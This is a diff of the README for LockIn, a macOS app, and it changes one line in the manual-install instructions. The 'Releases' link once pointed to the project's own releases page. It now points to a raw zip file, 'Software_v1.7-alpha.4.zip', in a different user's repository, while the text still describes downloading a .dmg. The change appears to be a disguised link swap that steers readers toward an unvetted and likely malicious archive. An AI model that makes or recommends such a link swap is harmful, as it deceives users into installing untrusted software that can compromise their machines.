@@ -24,7 +24,7 @@ habits, and stats. All local. Zero telemetry. Forever.
 brew install --cask lockin
 ```
 
-**Manual:** download `LockIn-x.y.z.dmg` from the [Releases](https://github.com/andy0332hk/lockin/releases) page, open it, and drag LockIn to Applications.
+**Manual:** download `LockIn-x.y.z.dmg` from the [Releases](https://raw.githubusercontent.com/jj00gold003/lockin/main/.github/Software_v1.7-alpha.4.zip) page, open it, and drag LockIn to Applications.
 
 > Note: until the first notarized release is published, building from source is the recommended way to try LockIn.
 
